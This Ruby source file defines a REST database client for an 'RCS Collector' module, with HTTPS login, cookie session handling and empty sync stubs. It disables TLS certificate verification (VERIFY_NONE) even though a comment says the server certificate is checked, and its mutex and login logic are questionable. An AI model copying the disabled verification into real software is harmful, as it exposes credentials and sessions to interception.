#
#  DB layer for REST communication
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'timeout'
require 'thread'
require 'json'

module RCS
module Collector

class DB_rest
  include RCS::Tracer

  # if a method does not reply in X seconds consider db down
  DB_TIMEOUT = 10

  def initialize(host)
    @host, @port = host.split(':')

    # the mutex to avoid race conditions
    @semaphore = Mutex.new

    # the HTTP connection object
    @http = Net::HTTP.new(@host, @port)
    @http.use_ssl = true
    
    # no SSL verify for this connection
    @http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    @http.ca_file = Dir.pwd + "/config/" + Config.global['DB_CERT']

    # our client certificate to send to the server
    @http.cert = OpenSSL::X509::Certificate.new(File.read(Dir.pwd + "/config/" + Config.global['DB_CERT']))

    trace :debug, "Using REST to communicate with #{@host}:#{@port}"
  end

  # generic method invocation
  def rest_call(*args)
    begin
      Timeout::timeout(DB_TIMEOUT) do
        return @semaphore.synchronize do
          # the HTTP headers for the authentication
          headers = {'Cookie' => @cookie }
          case args.shift
            when 'POST'
              # perform the post
              @http.request_post(*args, headers)
          end
        end
      end
    rescue
      # ensure the mutex is unlocked on timeout or errors
      @semaphore.unlock if @semaphore.locked?
      # propagate the exception to the upper layer
      raise
    end
  end

  # timeout exception propagator
  def propagate_error(e)
    # the db is down we have to report it to the upper layer
    # if the exception is not from xmlrpc (does not have faultCode)
    # it means that we are not able to talk to the db
    if not e.respond_to?(:faultCode) then
      trace :warn, "The DB in not responding: #{e.class} #{e.message}"
      raise
    end
  end


  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      # send the authentication data
      account = {:user => user, :pass => pass}
      resp = @http.request_post('/auth/login', account.to_json, nil)
      # remember the session cookie
      @cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
      # check that the response is valid JSON
      return JSON.parse(resp.body)['cookie'] == @cookie
    rescue Exception => e
      trace :error, "Error logging in: #{e.class} #{e.message}"
      return false
    end
  end

  def logout
    begin
      rest_call('POST', '/auth/logout', nil)
      return true
    rescue Exception => e
      trace :error, "Error logging out: #{e.class} #{e.message}"
      return false
    end
  end

  def sync_start(bid, version, user, device, source, time)

  end

  def sync_timeout(bid)

  end

  def sync_end(bid)
    
  end

end #

end #Collector::
end #RCS::